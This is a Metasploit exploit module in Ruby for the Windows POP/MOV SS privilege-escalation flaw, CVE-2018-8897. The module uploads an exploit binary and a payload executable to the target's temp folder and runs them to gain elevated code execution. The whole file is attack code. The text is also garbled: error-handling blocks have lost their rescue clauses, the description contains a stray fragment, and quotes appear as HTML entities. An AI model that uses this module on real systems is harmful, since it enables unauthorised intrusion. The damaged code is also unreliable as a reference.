# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/windows/priv&#039;
require &#039;msf/core/post/windows/registry&#039;
require &#039;msf/core/exploit/exe&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Microsoft Windows POP/MOV SS Local Privilege Elevation Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in a statement in the system programming guide
        of the Intel 64 and IA-32 architectures software developer&#039;s manual being mishandled
        in various operating system kerneles, resulting in unexpected behavior for #DB
        excpetions that are deferred by MOV SS or POP SS.

        payload in order to gain remote code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Nick Peterson&#039;,        # Original discovery (@nickeverdox)
          &#039;Nemanja Mulasmajic&#039;,   # Original discovery (@0xNemi)
          &#039;Can BAPlA1/4k <can1357>&#039;,  # PoC
          &#039;bwatters-r7&#039;           # msf module
        ],
      &#039;Platform&#039;       => [ &#039;win&#039; ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;May 08 2018&#039;,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2018-8897&#039;],
          [&#039;EDB&#039;, &#039;44697&#039;],
          [&#039;BID&#039;, &#039;104071&#039;],
          [&#039;URL&#039;, &#039;https://github.com/can1357/CVE-2018-8897/&#039;],
          [&#039;URL&#039;, &#039;https://blog.can.ac/2018/05/11/arbitrary-code-execution-at-ring-0-using-cve-2018-8897/&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;DisablePayloadHandler&#039; => &#039;False&#039;
        }
    ))

    register_options([
      OptString.new(&#039;EXPLOIT_NAME&#039;,
        [false, &#039;The filename to use for the exploit binary (%RAND% by default).&#039;, nil]),
      OptString.new(&#039;PAYLOAD_NAME&#039;,
        [false, &#039;The filename for the payload to be used on the target host (%RAND%.exe by default).&#039;, nil]),
      OptString.new(&#039;PATH&#039;,
        [false, &#039;Path to write binaries (%TEMP% by default).&#039;, nil]),
      OptInt.new(&#039;EXECUTE_DELAY&#039;,
        [false, &#039;The number of seconds to delay before executing the exploit&#039;, 3])
    ])
  end

  def setup
    super
    @exploit_name = datastore[&#039;EXPLOIT_NAME&#039;] || Rex::Text.rand_text_alpha((rand(8)+6))
    @payload_name = datastore[&#039;PAYLOAD_NAME&#039;] || Rex::Text.rand_text_alpha((rand(8)+6))
    @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
    @payload_name = "#{payload_name}.exe" unless payload_name.match(/\.exe$/i)
    @temp_path = datastore[&#039;PATH&#039;] || session.sys.config.getenv(&#039;TEMP&#039;)
    @payload_path = "#{temp_path}\\#{payload_name}"
    @exploit_path = "#{temp_path}\\#{exploit_name}"
    @payload_exe = generate_payload_exe
  end

  def validate_active_host
    begin
      host = session.session_host
      print_status("Attempting to PrivEsc on #{sysinfo[&#039;Computer&#039;]} via session ID: #{datastore[&#039;SESSION&#039;]}")
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      raise Msf::Exploit::Failed, &#039;Could not connect to session&#039;
    end
  end

  def validate_remote_path(path)
    unless directory?(path)
      fail_with(Failure::Unreachable, "#{path} does not exist on the target")
    end
  end

  def validate_target
    if sysinfo[&#039;Architecture&#039;] == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Exploit code is 64-bit only&#039;)
    end
    if sysinfo[&#039;OS&#039;] =~ /XP/
      fail_with(Failure::Unknown, &#039;The exploit binary does not support Windows XP&#039;)
    end
  end

  def ensure_clean_destination(path)
    if file?(path)
      print_status("#{path} already exists on the target. Deleting...")
      begin
        file_rm(path)
        print_status("Deleted #{path}")
        elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
        print_error("Unable to delete #{path}")
      end
    end
  end

  def ensure_clean_exploit_destination
    ensure_clean_destination(exploit_path)
  end

  def ensure_clean_payload_destination
    ensure_clean_destination(payload_path)
  end

  def upload_exploit
    local_exploit_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2018-8897-exe&#039;, &#039;cve-2018-8897-exe.exe&#039;)
    upload_file(exploit_path, local_exploit_path)
    print_status("Exploit uploaded on #{sysinfo[&#039;Computer&#039;]} to #{exploit_path}")
  end

  def upload_payload
    write_file(payload_path, payload_exe)
    print_status("Payload (#{payload_exe.length} bytes) uploaded on #{sysinfo[&#039;Computer&#039;]} to #{payload_path}")
  end

  def execute_exploit
    sleep(datastore[&#039;EXECUTE_DELAY&#039;])
    print_status("Running exploit #{exploit_path} with payload #{payload_path}")
    output = cmd_exec(&#039;cmd.exe&#039;, "/c #{exploit_path} #{payload_path}")
    vprint_status(output)
  end

  def exploit
    begin
      validate_active_host
      validate_target
      validate_remote_path(temp_path)
      ensure_clean_exploit_destination
      ensure_clean_payload_destination
      upload_exploit
      upload_payload
      execute_exploit
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
      print_error(e.message)
      ensure_clean_exploit_destination
      ensure_clean_payload_destination
    end
  end

  attr_reader :exploit_name
  attr_reader :payload_name
  attr_reader :payload_exe
  attr_reader :temp_path
  attr_reader :payload_path
  attr_reader :exploit_path
end

